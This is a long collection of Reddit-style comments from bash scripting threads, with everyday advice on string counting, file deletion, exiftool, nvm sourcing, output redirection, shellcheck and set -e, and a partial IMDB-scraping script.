Using awk: echo $var Lucky Ducky &amp;#x200B; echo $var | awk -F'k' '{print NF-1}' 2
Ok, thank you
Remove everything that isn't a `k`, then look at its length: non_k=${sentence//k} count=${#non_k} echo "It contained $count ks"
Remove everything that isn't a `k`, look at its length, and do a bit of math: non_k=${sentence//k} count=$(( ${#sentence} - ${#non_k} )) echo "It contained $count ks" No need for `grep` or `awk` or `wc`.
Oh wow! I could see this being useful as all hell! &amp;#x200B; Thx for the share! Pinned! \-badshellZ 
I absolutely love it. :)
There is `at`, that can do some of the operations you listed. You might want to consider using that. It might simplify some of your functions.
Ingenious. All that's missing is the ability to define a textual reminder and have it show up as a notification in the notification center (desktop).
I have a few bash scripts that do something similar: inpath --root *At* Directory '/home/common/sbin/': 'GuiTellAllUsersAt' -&gt; 'TellAllUsersAt': Not executable by user! 'TellAllUsersAt': Not executable by user! Directory '/home/common/bin/': 'AlarmTellAt' 'At' 'AtQueue' 'AtRemove' -&gt; 'AtQueue' 'GuiTellAt' -&gt; 'TellAt' 'MailAt' 'TellAt' The main script is 'At' (doesn't use Linux's 'at') that relies on a service provided by a general purpose daemon (bash script 'CommonDaemon' which doesn't use Linux's 'cron').
Mixing [ and [[, assumes bash is in /bin... You should have shellcheck.net verify your code. You probably don't even need bash, but sh will suffice. FWIW, sh is enough for mine (lie-to-me in https://gitlab.com/moviuro/moviuro.bin)
So the answer to the question "Bad Practice? Or just misunderstood?" is "I have made a program that generates comment boxes"? That's not an answer. People advise against using comment boxes because it's a pain to keep the right edge straight, and the top and bottom rows the right length. It's *more* annoying to copy/paste the old comment into this script, edit the comment, export it, then copy/paste the new comment box back into the code. The obvious answer to 'should you use comment boxes?' is 'no - just put a row of hashes above and below block comments if you want them to stand out, then there's no management of right edges or lengths if you want to change the comment'. I appreciate that you're proud of a neat script you made, but you framed it completely wrongly. 
For me, the biggest problem isn’t that comment boxes (or comments in general) can contain stale information. The problem is that they are steeling screen real-estate and they are drawing attention away from the important bits; the code. In 99% of the cases you can use explanatory naming to avoid adding comments. If for some reason you need to explain something in detail, which happens, just add a comment. Why the box thing? Well that’s my view. That being said, kudos for making the plugin. Everyone will have different views on this and you just made it easier to work with and that’s great. 
I think there are some programs where box comments are acceptable but very few in general. The one scenario where I consistently use box comments is in bash scripts, where they are the best way to implement "docstrings" for functions. IMHO a regular comment just won't do for documenting a function.
Just curious, have you considered pi-hole?
Easy with find. `find . -size 20M -exec rm {} \;`
no problem ) someone will surely find it useful 
I don't know a tool for this, but it should be possible to do this with a one-liner that combines 'find', 'sort' and calculations done with 'awk' to get a list of files to delete. You can customize the output of 'find' when you use its `-printf` parameter. You can then add date and size in front of the file names to use those in 'sort' and 'awk'. It's kind of simple but needs a good bit of looking things up in the man-page and then experimenting.
I use them if the comment contains something that's important for people who are going to read my code and change something without fully understanding it. For example, if I've used an outdated or dodgy-looking function, which someone might want to remove or replace with a more widely accepted one (but doing so will totally break the code in unforeseeable ways), I'll put a box comment explaining why the code is the way it is. If it's just explanatory, then I won't bother with a box.
I do use shellcheck, it didn't specify usage of [ or [[. It is my understanding double brackets are more modernized than [ and has more features.. not that I'm using any of those features for that particular line, but it's just what felt right to use in that particular spot. I could have done this in Python or Ruby too, but I wanted to use Bash. :)
Absolutely! i use my Pi for other things and didn't want to tie it up by using it for something I can do at the network or PC level.
Probably using head or tail would be how I'd approach it. It really depends on the file, though; most things are not valid if you do a raw byte chop.
I'm kind of curious why you're not using the find command to recursively act on files in directories?
Yours is also a better solution if you just want it on one device. I wanted it network wide so pihole works for me. Good stuff!
You don't need a for loop, you can do this: filearray=( "$item"/* ) About sub-directories, enable the "globstar" feature: shopt -s globstar And then you can use `**` to make bash search through sub-folders: filearray=( "$item"/**/* ) Don't forget that you can experiment with everything at the command line, you don't have to edit a script and run it again all the time just to try something. For example: $ mkdir t; cd t $ touch a b c $ foo=( * ) $ echo "${foo[0]}" a $ echo "${foo[1]}" b $ echo "${foo[@]}" a b c 
The line you wrote looks good. Consider adding `noatime` to the list of options. It's an option that disables logging access times for files. You can read more here: http://www.tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap6sec73.html 
use `-delete` instead
The top answer at the link below shows two methods, one using `dd` and one using `tail`, that are hard to beat. https://unix.stackexchange.com/questions/32941/use-dd-to-cut-file-end-part
You're going to stay that way if you prefer asking people to hand-deliver you knowledge instead of searching for it. 
That's a really great idea, I'll add the notification feature next week. Thanks!
 /usr/bin/notify-send -u critical -t 300000 "foo" Or /usr/bin/notify-send -u normal -t 30000 "bar" At least on Centos 
Nice, thanks for sharing! I had no idea that it was that easy to pop a notification, and it works on XUbuntu as well.
I reviewed the `at` command per your suggestion and it will definitely simplify things in the script. You rock!
I absolutely love the GUI wrapper in AWT/SWING. It brings back memories. :)
Thanks man, I appreciate it.
bash is a superset of sh. As you don't use any bashisms, I suggest you use sh instead, which is more portable - to BSD for example with no other changes to make
Sorry it took so long, but got er done.
You are right :-) I wrote a Java program that provides the following GUI dialogs: inpath Dialog_* Directory '/home/common/bin/': 'Dialog_CheckList' -&gt; 'RunCommonJavaJar' 'Dialog_DirectorySelection' -&gt; 'RunCommonJavaJar' 'Dialog_FileSelection' -&gt; 'RunCommonJavaJar' 'Dialog_InputText' -&gt; 'RunCommonJavaJar' 'Dialog_Message' -&gt; 'RunCommonJavaJar' 'Dialog_MessageTimed' -&gt; 'RunCommonJavaJar' 'Dialog_RadioList' -&gt; 'RunCommonJavaJar' In my system, Java is distro-independent.
Works in Gnome, too. So awesome, thanks!! I also had no idea this was so easy.
It's hard to answer without seeing your script(s). I'd probably just put each into a function, then at the start of your file generate a random number. If odd, run one function, if even, run the other.
Combine the lines 3-6 with a delimiter (say a semi-colon). Then write it in your file as one line. Run `shuf &lt;filename&gt; | tr ";" "\n"`. For example this is line 1; prints in second line this is in line 2 but prints first; and then this one Saving it to a file and running it with the above command this is line 1 prints in second line this in line2 but prints first and then this one 
Since a `for` loop is generally more flexible than the solution u/ropid mentioned, I’ll mention an improvement over your approach: for file in "$item"/*; do filearray+=("$file") done This way, you don’t have to keep track of the index yourself, you just tell Bash to append elements to the end of the array. (I’ve also added some quoting.)
 case ${RANDOM:1:1} in 0) dosomething ;; 1) dosomethingelse ;; 2) esac or 0|1|2) dosomething cool ;; 
 #!/bin/bash pageName="video" url="https://offbrandginger.tumblr.com/archive/filter-by/${pageName}" if [ ! -f ${pageName} ]; then wget ${url} fi readarray -t mp4s &lt; &lt;( tr '"' '\n' &lt; ${pageName} | grep http | grep '\.mp4$' ) for mp4 in "${mp4s[@]}"; do if [ ! -f "${mp4##*/}" ]; then wget "${mp4}" fi done
do you really need an array? blah=$(ls -1 */*) just make sure your IFS is set correctly. 
I just added Bash support so [funky] now supports both Bash and ZSH. [funky]: https://github.com/bbugyi200/funky
You could probably achieve what’s needed with the `--user-agent=“JFGI”` and the `—-header=“UA-Pixels: 1024x768”`. Although, there’s no real “standard” for sending screen sizes and different browsers seem to implement different methods. Best bet would be run a sample interaction in a real browser, sniff the headers (Browser Inspector et al) and transpose that to `wget`.
This may work most of the time, but it's considered a bad idea to parse `ls` output in the general case. This is something I've only recently learned and am slowly updating many of my scripts to use glob instead. http://mywiki.wooledge.org/ParsingLs
You haven't actually said what the problem is.
I'm having issue with either extracting than inserting GPS coordinates from JPEG to TIFF The best way I can say is I want to extract GPS info from JPEG files then insert that same GPS info that was just extracted to the TIFF files with the same coresponding name. Something similar to this: 20181119T235923-0600.jpg -&gt; GPS-INFO.txt GPS-INFO.txt -&gt; 20181119T235923-0600.tiff
The title should be: &gt; Safer bash scripts with `set -euo pipefail`, also use `set -x` to debug But yes, use euo pipefail along with [shellcheck] (https://www.shellcheck.net/) and your script will get much better!
Disagree with `set -e`, its design is [fundamentally flawed](http://mywiki.wooledge.org/BashFAQ/105). This statement from the article: &gt; The -e option will cause a bash script to exit immediately when a command fails. is false. What happens is the scripts exits immediately if a command returns a non-zero exit status. Whether that represents a failure or not depends on the command. For example, `grep` returns status 1 for non-match, which is as expected. 
https://www.reddit.com/r/bash/comments/8asn1e/trying_to_understand_a_script_to_delete_all_but/dx1y785
The behavior of the POSIX shell script affected by `set -e` is [well defined](http://pubs.opengroup.org/onlinepubs/009695399/utilities/set.html). Also, the cited statement is incomplete but not wrong. Please see the provided link.
I can't think of much, but if a back slash is allowed, &lt;\' &gt; "''" Assuming of course, that the file `'` exists. It seems possible that there is a way to do more. 
`printf '++++----+--++' | tr + '\n' | awk '{print length}' | sort -nr | head -1` Or this one, if you are a fan of GNU coreutils extensions: `printf '++++----+--++' | tr + '\n' | wc -L`
`&lt;"'" &gt; "''"`
This method doesn't solve "in a row"
**O RLY?** Seriously, have you tried running it?
Why bother counting them if all you need to know is whether there are three minuses in a row? grep -q -- '---' &lt;&lt;&lt;$string &amp;&amp; echo Fail!
ahh, I misread the tranlate bit, carry on
How about this? case "$(date +%H)" in 05|06|07|08|09) printf 'Good morning, sir.\n' ;; 10|11|12|13|14|15|16|17) printf 'Good day, sir.\n' ;; 18|19|20|21|22) printf 'Goo night, sir.\n' ;; esac 
Yes, I was just messing around, given the constraints. However, I also tried symlinking one file and have it output to itself, but that didn't work as a loop either. 
 attendance=++++----+--++ if [[ $attendance == *---* ]]; then echo 'Skipped at least 3 classes in a row' fi 
We can make things simpler by assuming we've got "decimal time" &amp;mdash; that is 100 in the hour. Obviously that's not correct, but as far as _ordering_ and _comparing_ times, it is.-- With this in mind we can easily construct a numeric value from the current time as follows: eval time="$(printf '$(( %(%H * 100 + %M)T ))')" You can then do whatever comparisons or tests you want, e.g.: if (( time &gt;= 500 &amp;&amp; time &lt; 1030 )); then echo 'Good morning' fi Take care that you don't use `0500` here though: that would be interpreted as an octal value, and will definitely not do the right thing.
 exiftool \*.jpg &gt; \*.txt &amp;#x200B; doesn't do what you think it does. It dumpsd the exif data of all files into one file called '\*.txt'
exiftool -EXIF:XResolution= -EXIF:YResolution= -EXIF:ResolutionUnit= -IPTC:All= -tagsFromFile foo.jpg -EXIF:All --IFD1:All -IPTC:All foo.tiff The above command seems to preserve all tags in my quick tests. you could do a loop through that. I found it here [https://www.imagemagick.org/discourse-server/viewtopic.php?t=16910](https://www.imagemagick.org/discourse-server/viewtopic.php?t=16910) &amp;#x200B; &amp;#x200B;
Maybe if you stopped skipping class, you'd have a better idea...
I have tried both of your solutions, with no success on preserving GPS exifdata still. I even modify the exiftool command you provided like so: exiftool -EXIF:XResolution= -EXIF:YResolution= -EXIF:ResolutionUnit= -IPTC:All= -EXIF:GPSLatitude= -EXIF:GPSLongitude= -EXIF:GPSAltitude= -EXIF:GPSDateStamp= -EXIF:GPSLatitudeRef= -EXIF:GPSLongitudeRef= -EXIF:GPSAltitudeRef= -EXIF:GPSTimeStamp= -EXIF:GPSTrack= -EXIF:GPSSpeed= -EXIF:GPSImgDirection= -EXIF:GPSPitch= -EXIF:GPSTrackRef= -EXIF:GPSSpeedRef= -EXIF:GPSImgDirectionRef= -EXIF:GPSRoll= -tagsFromFile *.jpg -EXIF:All --IFD1:All -IPTC:All *.tiff This might be a lost cause, but I will have to do some more reading on this because that is still useful.
Your best bet would be to try just to get one file right manually at the commandline. I tested the exiftool command and it works for me. Note the foo placeholder file names. you need to change these. You cant use \* in this command you need a do loop to go through the files. &amp;#x200B; &amp;#x200B;
 for f in *.jpg do name=`basename $f .jpg` exiftool -EXIF:XResolution= -EXIF:YResolution= -EXIF:ResolutionUnit= -IPTC:All= -tagsFromFile $name.jpg -EXIF:All --IFD1:All -IPTC:All $name.tiff done Something like that. You'd to well to do a bit of general reading into bash scripting. This is a great document: [http://www.tldp.org/LDP/abs/html/index.html](http://www.tldp.org/LDP/abs/html/index.html) &amp;#x200B;
Yeah, I really need to. This was something I thought up in the last couple of weeks to make things quicker with archiving tons of family photos. And I want to take advantage of that GPS info since it was there. Thank you so much for the help.
I think the easiest would be double pipe line || this basically says if the command before succeeds don't run the next command, but if the previous command fails run the next command. So you could put mount /backup /dev/sdc || exit
Pardon formatting issues, I’m on mobile. Use -xe with your script and echo out all commands and exit on any failure. Or, do something like this: cmd() { echo “Running $@“ if ! $@; then exit 1 fi } cmd false
Place `set -e` right after shebang line and check the results.
Why? &amp;#x200B; Just why? &amp;#x200B; Sounds like homework.
yes I've done it this way 
 jq '.buildNumber += 1' package.json | sponge package.json This uses the `sponge` command from the `moreutils` package to avoid the temporary file, otherwise you can do the same `package.json.tmp` trick as in your original post.
I actually got it sorted by getting rid of the pipe and having the write to file and copy over part as a second command. Dunno why, it just have me what I exactly wanted.
I'm not familiar with bash scripting, so pardon my question... &amp;#x200B; In the 'cmd() {' do I copy &amp; paste each command into it?
I changed it to say 'commands' instead of scripts. That's probably more accurate. User will do changes through a web interface. These changes are too time consuming to make the user wait for them, that's why I want to store the commands in a table and let them run in the background. When it's done the user can see the output of the commands in the web interface.
The command would be mysql. Found after 2 seconds with "mysql bash" https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/ Not sure how hard that is to find google keywords if there are only two and both are pretty obvious. If it is a good idea is another discussion.
No, this is absolutely not what I'm looking for. Your link explains how to run mysql queries in bash. I could find the different components to start writing the script myself, but I'm wondering, before I invest the time, if there is anything out there that already exists and probably goes above and beyond these initial requirements. But thank you anyway. &amp;#x200B;
Sorry for misunderstanding the question. As this is such a specific case, I think that making it from scratch will be a lot easier than trying to re-write something that is not 100% what you need.
[[ ! -d $1 ]] &amp;&amp; echo $1 || [[ ! -d $2 ]] &amp;&amp; echo $2? Maybe this helps?
You want to roll your own asynchronous request processing framework in bash and raw MySQL instead of using one of the variety of methods baked into any decent web development stack? 
The whole point of joining tests with `if [[ test1 || test2 ]] ...` is that you don't care which of the tests is true. The elegant course is the one your gut told you this time - evaluate the conditions separately. for dir in $1 $2 ...; do if [[ ! -d "$dir" ]]; then echo "Argument '$dir' is not a directory" fi done
What you want sounds kind of like Ansible playbooks and roles. What are you trying to do?
I use a general purpose daemon that runs in a loop checking 'conditions' and running 'actions'. Some 'conditions' and 'actions' are internal but you can add as many external 'conditions' and 'actions' (scripts) as you want. Some (long running) 'actions' are launched in background (to keep the loop's period stable) and the daemon checks periodically which processes have finished running. The Daemon keeps a log which includes (finished) background processes's info. [Here is a log sample](https://pastebin.com/ggPNycFU).
You're absolutely right, Thank you!
I don’t know if it exists, but I wonder, is there really no way you can store the names of declared arrays somewhere?
I wanted to print which of those two arguments was true if met, but doubt solved. thx anyway!
OP, share your code so we get context. If you’re not storing your array somewhere: &gt;&gt; arrayList=( one two three ) &gt;&gt; printf “%s\n” “${arrayList[@]}” Then how are you calling them?
`declare -p` will print all variables. You can pipe it into `grep '^declare -[aA]' to only list arrays (indexed or associative).
The good thing about bash is there's tones of examples on the internet, just need to know the right questions to ask. [https://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed](https://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed) Answer: sed -e ':a' -e 'N' -e '$!ba' -e 's/\\n/ /g' /path/to/file For an explanation please follow the link above.
 This will replace newlines with spaces. tr "\n" " " 
So lets say I have a file named test. Would I direct terminal to that directory by using cd .. then type tr "\n" "test" ?
You've got your answer already, but you should know that if the first operand of the 'or' is true, the second is not even evaluated. So you can do things like [[ condition met ]] || { printf "condition not met, quitting" ; exit 1; }
 *tr* reads from stdin, writes to stdout, so you pipe it cat test | tr "\n" "test" 
You've got it backwards. Try: test -f file &amp;&amp; echo Yes || echo No
`cat test | tr "\n" " " &gt; output.txt`
This is almost impossible to answer without more detail. Why don't you just run sed in the script and assign it's result to a variable?
 STRING1=`cat file.txt` echo $STRING1 
&gt;readarray i found this isn't work on os x to save to list: to download: curl https://offbrandginger.tumblr.com/archive/filter-by/video | grep -Eo "https://[..-_a-z]{1,}.mp4 &gt; file.txt 
There is an additional expansion that is useful here: you can use `{!prefix@}` to expand to all variables with a name that starts with `prefix`, for example array_one=(1 2 3) array_two=(a b c) printf '%s\n' "${!array_@}" results in array_one array_two Combine that with a loop where the control variable is a nameref: declare -n arr for arr in "${!array_@}"; do echo "$arr[@]}" # arr behaves as if it were array_one/array_two here done 
screen or tmux. But why aren't you using the irssi config file for your auto connections and joining of chat rooms?
Supposing it's an `apt` based distro : ```sh apt list --installed | grep 'package-name' || apt install 'package-name' ```
With *apt* you don't even need to check. Just tell it to install. If its already installed, it will just exit.
With most (all?) package manager we wouldn't need to check, but OP wants to check so...
ABC=$(cat file1 | sed filter to remove new line)
xargs is fun. cat file | xargs -n1 cat file | xargs -n2 cat file | xargs -n5 cat file | xargs -n9 
xargs sudo apt-get -y install &lt; pkglist
Use “which” and check exit code, != 0? Install application 
There is something wrong with your code, you are trying to delete something that does not exist
&gt; Again, it does work and it removes the files Why do you think it worked? If there weren't any files to remove, that's the sort of error message you'd get. How are you distinguishing "there were no files to remove" from "all files were removed"? Note also that if `rm` is asked to remove several files, it is possible for error messages to be reported on only some of them. For instance: $ mkdir /tmp/foo $ touch /tmp/foo/{a,c,e} $ rm /tmp/foo/{a,b,c,d,e} rm: cannot remove '/tmp/foo/b': No such file or directory rm: cannot remove '/tmp/foo/d': No such file or directory $ ls -l /tmp/foo total 0
If I understand you correctly, you are suggesting that the directory may be empty? It is definitely not. It just contains one file usually. But never 0 files. Or are you saying that it removed all files and doesn't find one called path/\*? The same thing happens if I put in a text file and use `rm path/*.txt`.
Yes but then how does it delete the file regardless of the error?
is there a line in the script that literally references "path/to/file/\*"? Or perhaps rm is running twice somewhere? &amp;#x200B; It's really hard to tell when you are so vague about what the code actually is.
If your aim is to just not display the error you could redirect the error output? [script.sh](https://script.sh) 2&gt; /dev/null (overkill?) You should make a habit of at least looking at scripts that you run, to try and learn about them. Did you write this one or just running it blind? &amp;#x200B;
The test I am running is literally a .sh file containing only one line, namely `rm: path/to/file/*: No such file or directory`. Before I run it I create a .txt file and put it inside the directory I am accessing. So before running it there is a file and after running it there isn't one. That's all I know.
It's literally just that one line. Because I am just now getting into bash script and am testing things out.
We already do this, but, it would be difficult if we introduce another file into the picture.
What is the line? &amp;#x200B;
&gt;rm: path/to/file/\*: No such file or directory isn't a command
Because, probably, before encountering the offending path there are valid ones
try rm *.txt &amp;#x200B;
It's hard to help unless you give us more details. * We need to see the exact command line you're using to perform the delete * And an `ls -a` of the target directory you're deleting files in. If it's not the current directory `ls -a target/directory`. * And add `-v` to your rm command so we can see better what it's doing If we get all of that I bet this would be solved quickly.
path/to/file is a place holder used in documentation not an actual path. &amp;#x200B; Here is a great document about bash scripting [http://www.tldp.org/LDP/abs/html/index.html](http://www.tldp.org/LDP/abs/html/index.html)
Amen
I like.
Shall experiment.
Sorry. I just ser my reply and don't contain backticks You should use enclosing var asignation
I used this to learn see, awk, and grep. It is a wonderful tutorial.
No it's not. http://www.tldp.org/LDP/abs/html/refcards.html is a handy reference card, but much of the book contains bad advice.
It holds up as a good reference throughout, but don’t follow the courses - they’re very outdated.
STRING1=“$(cat file.txt)” if you want to go full tilt.
‘cd ..’ just moves you up a directory (ie from /dir/folder/testFolder/ to /dir/folder) But you can also explicitly type the full file path in your command (ie ‘cat /dir/folder/testFolder/test.txt’)
Yes.
`&gt;` by itself always overwrites the destination file.
Correct.
&gt;No dependency on awk/gawk &gt;requires lua So.... Doesn't require standard gnu tools... Requires me to install something else... Gotcha. 
&gt; test -f file &amp;&amp; echo Yes || echo No I was so convinced it was with brackets, that I somehow did not think of doing this. Derp. Thanks for solving many hours of frustration and searching.
To cause no change. (a is written into a.)
That doesn't make any sense. Anything `&gt; a` will destroy a.
Why?
? It happens before cating a?
You're reading in the order you type, not the order the shell does things.
 You're reading in the order you type, not the order the shell does things. 
Yes, because it has to destroy the file first to make sure it is available to be written, before it can start the command at all. Imagine if it were not deleted first. Then `cat a` is already producing output. Where does it go? So the file must be deleted first, before `cat a` can even be run.
Thanks!
Redirection happens before the program is executed, so the file is empty by the time cat runs. See https://unix.stackexchange.com/questions/41207/why-does-cating-a-file-into-itself-erase-it
Or just ‘echo a &gt; a’ (&gt;&gt; to append, not overwrite)
Do you always use modern hardware ? have you ever tried fasd / z / autojump on cygwin/msys ? terminal stuck for almost 1 second after every command you entered. z.lua makes autojump feature possible on slow hardwares and cygwin/msys. Another thing, I only got a busybox shell on my router which is incompatible with original z.sh, but z.lua works with busybox. I took time to write z.lua because it can solve these problems, not just for fun.
'echo a &gt; a' will write literal 'a' into file named 'a'. The semantics of `cat a | sponge a` are different.
This is literally the first result when searching for "exit code 2" and it has the answer: http://tldp.org/LDP/abs/html/exitcodes.html Did you verify that the code runs locally first? Something seems to be wrong with it, and it looks messy so you need to clean it if you want better help. Use markdown to make your code readable: https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet#code
I’m thankful, ZSH has seemed a bit slow for me even on a 6 Core Mac Pro with 32GB of RAM, so I’ll give this a shot. 
Which totally won't work if OP is using anything other than a Debian based distro.
cat a &gt;&gt; a
This looks interesting. I wonder how it works compared to rg --files |fzf. Maybe some testing after work :)
That’s true but it’s not really the point here. It’s that a novice would expect “cat a &gt; a” to leave the file “a” with its original contents, instead of what actually happens.
What are you *actually* trying to do? If you’re just trying to cause no change in this example you shouldn’t run any command at all. 
If a beginner were to think that the output could be buffered somewhere (and probably is), then I would ask them how big of a buffer they would need for an arbitrary-sized file and whether it's reasonable to expect such a buffer to be available.
The buffer could be a temporary file.
Then I'm lookimg forward to trying it :)
&gt; 10x times faster than fasd and autojump &gt; 3x times faster than z.sh Do you have anything to back that up? Is it across the board or only on devices that don't have a lot of processing power to begin with? Those are pretty bold claims that you throw in there with no context on what you tested, where you tested it and how you did it.
&gt; to make sure it is available to be written You don't need to do anything "destroy"-like to a file in order to write to it; several tools like `sed`, `sponge`, and `dd` can write output without exhibiting the same behavior as redirection. &gt; Imagine if it were not deleted first. The file isn't deleted.
Error message: cat: a: input file is output file
Why not simply do "cat a &gt; b; rm a; mv b a"?
If sponge is installed.
It is faster than fast/autojump/z.sh on all platforms. I made a simple test: $ time autojump --add /tmp real 0m0.352s user 0m0.077s sys 0m0.185s $ time _z --add /tmp real 0m0.194s user 0m0.046s sys 0m0.154s $ time _zlua --add /tmp real 0m0.052s user 0m0.015s sys 0m0.030s 
Wow this seems quite nice. Sorry if I sounded a bit rude in my comment. This is quite impressive! 
never mind. As you said, a profile is very necessary.
Had no idea.
What's the point of the `rm` ? `cat a &gt; b; mv b a`
Yup, I was thinking echo. Too much turkey in me at that moment.
Do you mean touch a 
"tee" appears to work, but you may wish to disable the stdout copy cat a | tee a &gt;/dev/null 
The rm isn't needed for most people. I just put it there from habit. Because I have my mv set up to notify me if it's going to clobber a file that already exists. 
`mv -i` aliased as mv? That would have actually saved me a couple of times
It's actually a little more complicated than that, because I don't want it to be interactive. But that's the basic idea.
The paste isn't there anymore :-( you can always post it at [https://paste.nickshelp.info](https://paste.nickshelp.info). Why do you change the address every day?
try: Boot=$(diskutil info / | grep "Volume Name:" | awk '{print $3}')
Yeah the syntax in bash is, when assigning values, no spaces on either side of the equals sign.
and also command substitution: [http://wiki.bash-hackers.org/syntax/expansion/cmdsubst](http://wiki.bash-hackers.org/syntax/expansion/cmdsubst) just Boot=diskutil info / | grep "Volume Name:" | awk '{print $3}' wouldn't work
awesome! got me over a real hurdle there - thanks! 
I love reading scripts that others have written, thank you for posting it!
That looks useful, I'm going to try that. 
Thanks for the response! .bashrc had these lines : export NVM\_DIR="$HOME/.nvm" \[ -s "$NVM\_DIR/nvm.sh" \] &amp;&amp; \\. "$NVM\_DIR/nvm.sh" # This loads nvm \[ -s "$NVM\_DIR/bash\_completion" \] &amp;&amp; \\. "$NVM\_DIR/bash\_completion" # This loads nvm bash\_completion &amp;#x200B; I believe nvm's install script takes care of the PATH. Any ideas ? &amp;#x200B;
What about your .profile or .bash_profile?
Do you have the variable BASH_ENV set?
What does `type nvm` print?
Hey, brujoand, just a quick heads-up: **therefor** is actually spelled **therefore**. You can remember it by **ends with -fore**. Have a nice day! ^^^^The ^^^^parent ^^^^commenter ^^^^can ^^^^reply ^^^^with ^^^^'delete' ^^^^to ^^^^delete ^^^^this ^^^^comment.
Hey BooCMB, just a quick heads up: The spelling hints really aren't as shitty as you think, the 'one lot' actually helped me learn and remember as a non-native english speaker. They're not *completely* useless. Most of them are. Still, don't bully somebody for trying to help. Also, remember that these spambots will continue until yours stops. Do the right thing, for the community. Yes I'm holding Reddit for hostage here. Oh, and while i doo agree with you precious feedback loop -creating comment, andi do think some of the useless advide should be removed and should just show the correction, I still don't support flaming somebody over trying to help, shittily or not. Now we have a chain of at least 4 bots if you don't include AutoMod removing the last one in every sub! It continues! Also also also also also Have a nice day!
Delete
hEy, BrUjOaNd, JuSt a qUiCk hEaDs-uP: **tHeReFoR** Is aCtUaLlY SpElLeD **ThErEfOrE**. yOu cAn rEmEmBeR It bY **EnDs wItH -fOrE**. hAvE A NiCe dAy! ^^^^tHe ^^^^pArEnT ^^^^CoMmEnTeR ^^^^CaN ^^^^RePlY ^^^^WiTh ^^^^'DeLeTe' ^^^^To ^^^^dElEtE ^^^^ThIs ^^^^cOmMeNt.
DO NOT USE `PARTUUID=1068b060-01 /var/logs ext4 sync,auto,nodev,noexec,noatime,suid,rw,nouser, 0 2` YOUR Pi WILL NO LONGER BOOT. &amp;#x200B; If I find a way to repair this I will update it here.
But why... Why wouldn't you just have it log when something happens that you don't want to happen?
normally when two commands are ran they need to be separated with ; so for example &amp;#x200B; `echo hello;` `nvm --version` &amp;#x200B; you could also call the nvm script by using the absolute path using whereis &amp;#x200B; `whereis nvm` &amp;#x200B; then use the absolute path which would include the bin directory/sub-directory 
Did you just create an alt to respond to a bot?
Others already have pointed it out, just a summary. `nvm` is a function, not a command, you can check with the command `type`: $ type nvm nvm is a function To make `nvm` work inside a bash script, you must load the function definition, changing your script to: #!/bin/bash export NVM_DIR="$HOME/.nvm" [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh" # This loads nvm echo hello nvm --version
I recommend using `#!/bin/env bash`, but it's just a good practice, it won't solve your issue though. 
Tidy
Encryption would be cool 
But... there is already https://www.passwordstore.org/
zero market research ...
~~Good~~ **Great** Bot
 echo `cat file` **echo** will only print a single line echo `cat file` &gt; newFile redirect to a new file to store changes
My first thought is to use for loops, a nested for statement for each level of directory you want. 
You can experiment with that `{ ... }` feature of bash at the command line with `echo` or `printf "%s\n"`: $ echo hello_{0..2} hello_0 hello_1 hello_2 $ echo {a..c} a b c $ echo {0..2} 0 1 2 $ echo {a..c}{0..2} a0 a1 a2 b0 b1 b2 c0 c1 c2 You can get a list of those directory names you seem to want like this: $ echo dir/{0..9}/{0..9} dir/0/0 dir/0/1 dir/0/2 ... dir/9/7 dir/9/8 dir/9/9 If that output looks good to you, just use that `dir/{0..9}/{0..9}` with `mkdir -p`.
Not putting down your effort, but there are several ones already out there, including lastpass commandline. [https://blog.lastpass.com/2014/10/open-sourced-lastpass-command-line-application-now-available.html/](https://blog.lastpass.com/2014/10/open-sourced-lastpass-command-line-application-now-available.html/) &amp;#x200B;
The weather thing is interesting. Nice.
I haven't mentioned it here but in my case the lack of effort is kinda the point. This script is fiftyish lines of bash script XD It took me the same amount of time setting up [https://www.passwordstore.org/](https://www.passwordstore.org/) as to build a basic scaffold/mvp of my script. Now that i come to think of it, could add pgp encryption in another 5 lines of code or less. &amp;#x200B;
bogus.. there are no worthwhile **ls** shortcuts for a start, or anything for **mount**, **lynx** and package installation (**apt**). On the other hand, there are some 'cool'/overly-showy shortcuts. Volume uses somebody elses script vs using pactl/pulse
Thanks for the script. I am afraid my scripting knowledge is somewhat limited, but this is your script with a few modifications: #!/usr/bin/env bash # This program is free software: you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation, either version 3 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with this program. If not, see &lt;https://www.gnu.org/licenses/&gt;. # This script is used to fetch movies' details from the terminal using IMDB urlencode() { local string="${1}" local strlen=${#string} local encoded="" for (( pos=0 ; pos&lt;strlen ; pos++ )); do c=${string:$pos:1} case "$c" in [-_.~a-zA-Z0-9] ) o="${c}" ;; * ) printf -v o '%%%02x' "'$c" esac encoded+="${o}" done echo "${encoded}" } # First taking the movie as an argument ## check number of arguments if [[ $# -ne 1 ]]; then echo "Too many argumnets: Please only pass one movie or use \"NAME OF MOVIE\" for spaces." &gt;&amp;2 exit 1 fi ## Get the IMDB id movie_s=$(urlencode "$1") movie_id=$(curl -s https://www.imdb.com/find?q="$movie_s"\&amp;s=tt | grep -o '/title/tt[0-9]*/?ref_=fn_tt_tt_1' | head -1) ## Check if found if [[ -z $movie_id ]]; then echo -e "Sorry: couldn't find the movie.\nIn case of a typo check:\n" echo "$1" | aspell -a exit 1 fi # Parsing ## Init file findMovie=$(curl -s https://www.imdb.com/"$movie_id") ## Check if file exists if [[ -z $findMovie ]]; then echo "Error: couldn't get the movie's page." &gt;&amp;2 exit 1 fi ## Get title movie_full=$(echo "$findMovie" | grep '&lt;title&gt;' | grep -v IMDbPro | sed -e 's_^.*&lt;title&gt;\(.*\) - IMDb&lt;/title&gt;.*$_\1_g') movie_title=$(echo "$movie_full" | sed -e 's/ (.*[0-9]\{4\}.*).*$//g') ## Get year movie_year=$(echo "$movie_full" | sed -e 's/^.*(.*\([0-9]\{4\}\).*).*$/\1/g' ) ## Get Rating movie_rating=$(echo "$findMovie" | grep -o 'title="[0-9]*.[0-9]* based' | sed 's/title="//g' | cut -d' ' -f1) ## Get RatingCount movie_rating_count=$(echo "$findMovie" | grep -o 'based on 